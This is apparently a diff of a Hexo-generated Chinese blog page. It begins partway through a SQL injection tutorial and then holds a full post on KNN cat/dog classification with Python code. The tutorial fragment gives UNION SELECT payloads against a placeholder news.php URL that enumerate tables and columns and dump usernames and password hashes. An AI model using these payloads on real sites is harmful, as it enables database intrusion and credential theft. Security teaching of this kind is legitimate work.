+
+MySQL 版本信息
+</code></pre>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
+<p>这会列出当前数据库中的所有表名（通常会看到 users 表)</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+</p>
+<p>这会显示 users 表的所有列名（如 id, username, password）</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+</p>
+<p>这会显示所有用户名和密码（通常是 MD5 哈希）</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/03/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/08/03/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB/" class="post-title-link" itemprop="url">KNN猫狗分类</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-08-03 11:21:11" itemprop="dateCreated datePublished" datetime="2025-08-03T11:21:11+08:00">2025-08-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-30 20:59:15" itemprop="dateModified" datetime="2025-12-30T20:59:15+08:00">2025-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" itemprop="url" rel="index"><span itemprop="name">人工智能</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="KNN猫狗分类"><a href="#KNN猫狗分类" class="headerlink" title="KNN猫狗分类"></a>KNN猫狗分类</h1><p>在生活中不同种类的生物，可以通过身高、体重等特征来进行简单的分类。猫和狗的分类就是一个典型的例子。</p>
+<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>假设我们有：</p>
+<ul>
+<li>10 只猫的身高体重数据</li>
+<li>10 只狗的身高体重数据</li>
+</ul>
+<p>现有一个新样本（如 4.5kg, 28cm），如何判断它是猫还是狗？这就需要运用到KNN算法。</p>
+<h2 id="KNN-算法核心思想"><a href="#KNN-算法核心思想" class="headerlink" title="KNN 算法核心思想"></a>KNN 算法核心思想</h2><p>KNN（K-Nearest Neighbors）是一种基于邻近性的分类方法，其步骤包括：</p>
+<h3 id="1-计算距离"><a href="#1-计算距离" class="headerlink" title="1. 计算距离"></a>1. 计算距离</h3><p>测试样本与训练样本的距离（如欧氏距离）</p>
+<h3 id="2-找邻居"><a href="#2-找邻居" class="headerlink" title="2. 找邻居"></a>2. 找邻居</h3><p>选择最近的 k 个训练样本</p>
+<h3 id="3-投票分类"><a href="#3-投票分类" class="headerlink" title="3. 投票分类"></a>3. 投票分类</h3><p>根据邻居的多数类别决定测试样本的类别</p>
+<h2 id="欧氏距离计算"><a href="#欧氏距离计算" class="headerlink" title="欧氏距离计算"></a>欧氏距离计算</h2><p>邻近性是通过比较得出来的，比较的这个数值的一种典型的求法是<strong>欧式距离</strong>，用于计算空间中两点之间的直线距离。</p>
+<p>二维空间中的公式为：<br>$$d &#x3D; \sqrt{(x_2-x_1)^2 + (y_2-y_1)^2}$$</p>
+<h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><p>假设已知：</p>
+<ul>
+<li>猫：A(3.5kg, 25cm)</li>
+<li>狗：B(8.0kg, 40cm)</li>
+</ul>
+<p>想要预测一个新样本 C(4.5kg, 28cm) 是狗还是猫：</p>
+<p>$$d(C,A) &#x3D; \sqrt{(4.5-3.5)^2 + (28-25)^2}$$</p>
+<p>$$d(C,B) &#x3D; \sqrt{(4.5-8.0)^2 + (28-40)^2}$$</p>
+<h2 id="K值的重要性"><a href="#K值的重要性" class="headerlink" title="K值的重要性"></a>K值的重要性</h2><p>在实际中样本数量会更多，这个<strong>k值</strong>是非常重要的。对所有训练样本计算距离并排序，选择最近k个训练样本，k的值直接关乎到分类的准确性。</p>
+<h3 id="K值过小的问题"><a href="#K值过小的问题" class="headerlink" title="K值过小的问题"></a>K值过小的问题</h3><ul>
+<li>容易受到噪音和异常值的影响</li>
+<li>容易过拟合</li>
+</ul>
+<p><strong>举例</strong>：如果k&#x3D;1，在数据集中不小心将猫的数据标成狗，那模型只取这个错误的邻近值，导致最后的分类出错。</p>
+<h3 id="K值过大的问题"><a href="#K值过大的问题" class="headerlink" title="K值过大的问题"></a>K值过大的问题</h3><ul>
+<li>模型会倾向于选择多数类</li>
+<li>容易欠拟合</li>
+</ul>
+<p><strong>举例</strong>：如果数据中猫（60%）比狗（40%）多，K很大时所有新样本都会被预测为猫，即使某些区域狗更密集，也会导致分类出错。</p>
+<h2 id="投票机制"><a href="#投票机制" class="headerlink" title="投票机制"></a>投票机制</h2><p>投票是KNN算法的最后一个步骤：</p>
+<ol>
+<li>统计k个训练样本的标签</li>
+<li>比较哪种标签出现的次数多</li>
+<li>多数标签即为预测结果</li>
+</ol>
+<p><strong>示例</strong>：若 k&#x3D;3 的邻居是 <code>[猫, 猫, 狗]</code>，预测结果为 <strong>猫</strong>。</p>
+<p>除了简单投票法，还有加权投票法（根据距离加权）等方法。</p>
+<h2 id="Python-实现代码"><a href="#Python-实现代码" class="headerlink" title="Python 实现代码"></a>Python 实现代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练数据：[[身高(cm), 体重(kg), 类别], ...]</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="comment"># 猫的数据</span></span><br><span class="line">    [<span class="number">25</span>, <span class="number">4</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">23</span>, <span class="number">3.5</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">24</span>, <span class="number">4.2</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">22</span>, <span class="number">3.8</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">26</span>, <span class="number">4.5</span>, <span class="string">&quot;猫&quot;</span>],</span><br><span class="line">    [<span class="number">24</span>, <span class="number">4.1</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">23</span>, <span class="number">3.7</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">25</span>, <span class="number">4.3</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">22</span>, <span class="number">3.6</span>, <span class="string">&quot;猫&quot;</span>], [<span class="number">24</span>, <span class="number">4.0</span>, <span class="string">&quot;猫&quot;</span>],</span><br><span class="line">    <span class="comment"># 狗的数据</span></span><br><span class="line">    [<span class="number">45</span>, <span class="number">25</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">50</span>, <span class="number">30</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">48</span>, <span class="number">28</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">52</span>, <span class="number">32</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">47</span>, <span class="number">27</span>, <span class="string">&quot;狗&quot;</span>],</span><br><span class="line">    [<span class="number">49</span>, <span class="number">29</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">46</span>, <span class="number">26</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">51</span>, <span class="number">31</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">48</span>, <span class="number">28.5</span>, <span class="string">&quot;狗&quot;</span>], [<span class="number">50</span>, <span class="number">30.5</span>, <span class="string">&quot;狗&quot;</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">knn_classify</span>():</span><br><span class="line">    <span class="comment"># 用户输入</span></span><br><span class="line">    sg = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入身高(cm)：&quot;</span>))</span><br><span class="line">    tz = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入体重(kg)：&quot;</span>))</span><br><span class="line">    k = <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算距离</span></span><br><span class="line">    distances = []</span><br><span class="line">    <span class="keyword">for</span> sample <span class="keyword">in</span> data:</span><br><span class="line">        height_diff = sg - sample[<span class="number">0</span>]</span><br><span class="line">        weight_diff = tz - sample[<span class="number">1</span>]</span><br><span class="line">        distance = math.sqrt(height_diff**<span class="number">2</span> + weight_diff**<span class="number">2</span>)</span><br><span class="line">        distances.append((distance, sample[<span class="number">2</span>]))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按距离排序（冒泡排序）</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(distances)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(distances)):</span><br><span class="line">            <span class="keyword">if</span> distances[i][<span class="number">0</span>] &gt; distances[j][<span class="number">0</span>]:</span><br><span class="line">                distances[i], distances[j] = distances[j], distances[i]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 取前k个邻居</span></span><br><span class="line">    neighbors = distances[:k]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 投票分类</span></span><br><span class="line">    cat_count = <span class="number">0</span></span><br><span class="line">    dog_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> neighbor <span class="keyword">in</span> neighbors:</span><br><span class="line">        <span class="keyword">if</span> neighbor[<span class="number">1</span>] == <span class="string">&quot;猫&quot;</span>:</span><br><span class="line">            cat_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dog_count += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="keyword">if</span> cat_count &gt; dog_count:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;预测结果：这是猫&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;预测结果：这是狗&quot;</span>)      </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    knn_classify()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
 
 
 
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">qingshen</span>
   </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
 </body>
 </html>
